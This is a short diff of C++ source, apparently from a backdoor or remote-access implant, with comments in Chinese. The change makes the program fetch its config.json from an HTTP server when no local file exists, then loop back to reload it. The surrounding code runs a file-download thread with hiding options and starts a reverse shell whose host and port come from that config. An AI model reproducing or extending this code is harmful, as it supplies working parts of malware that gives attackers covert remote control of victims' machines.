@@ -76,10 +76,13 @@ void get_config()
 
     //const char config[] = "{\"version\":\"1.0\",\"cmdlines\":[\"cmd1\",\"cmd2\"],\"cmdIntervaltime\":123,\"Listening_port\":-1,\"updata_time\":-1,\"enable_shell\":true,\"shell_host\":\"127.0.0.1\",\"shell_port\":\"1234\",\"shell_protocol\":\"TCP\",\"retry_time\":10}";
     
+    openconfig:
     // 打开文件
     std::ifstream file("config.json", std::ios::in | std::ios::binary | std::ios::ate);
     if (!file.is_open()) {
-        throw "can't open config.json";
+        //本地无配置文件，从远程拉取
+        get_file(xiran_file("config.json","http://127.0.0.1:8080/testfile/config.json",hide_type::nohide));
+        goto openconfig;
     }
     
     // 获取文件大小
@@ -120,6 +123,7 @@ int main()
     //开启文件获取线程，防止文件下载出错影响主线程
     auto th = std::thread(start_file_get);
     th.join();//之后的定时任务可能会使用到下载的文件，所以等待此线程
+
 
     //启动反弹shell
     shell_start(thread_vec);
